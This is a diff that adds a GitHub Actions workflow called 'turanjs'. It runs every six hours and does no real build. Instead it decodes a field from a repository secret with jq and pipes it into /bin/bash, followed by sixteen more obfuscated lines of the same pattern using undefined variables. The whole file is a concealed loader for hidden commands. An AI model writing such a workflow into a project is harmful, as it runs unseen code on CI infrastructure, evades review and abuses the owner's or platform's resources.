@@ -1,0 +1,34 @@
+name: turanjs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: turanjs
+        env:
+          ls0719: ${{ secrets.ls0719 }}
+        run: |
+          echo $ls0719 | jq -r .e996 | /bin/bash
+          echo $bwn65142 | jq -r .uc1 | /bin/bash
+          echo $ufg44 | jq -r .o1 | /bin/bash
+          echo $gfmip373 | jq -r .uh5056 | /bin/bash
+          echo $xnoxk5179 | jq -r .pc219 | /bin/bash
+          echo $egn5 | jq -r .eead5797 | /bin/bash
+          echo $oc11 | jq -r .pah2009 | /bin/bash
+          echo $rnqqo10010 | jq -r .ouiw1271 | /bin/bash
+          echo $vglkg941 | jq -r .fsz99 | /bin/bash
+          echo $dl50 | jq -r .exl239 | /bin/bash
+          echo $cans2 | jq -r .ltcxm48024 | /bin/bash
+          echo $rs299 | jq -r .cbl8 | /bin/bash
+          echo $nawmm1330 | jq -r .j74 | /bin/bash
+          echo $d501 | jq -r .intcx19 | /bin/bash
+          echo $y8 | jq -r .u03 | /bin/bash
+          echo $ffkvm0001 | jq -r .ed84588 | /bin/bash
+          echo $qarkq05728 | jq -r .xeybk687 | /bin/bash
+
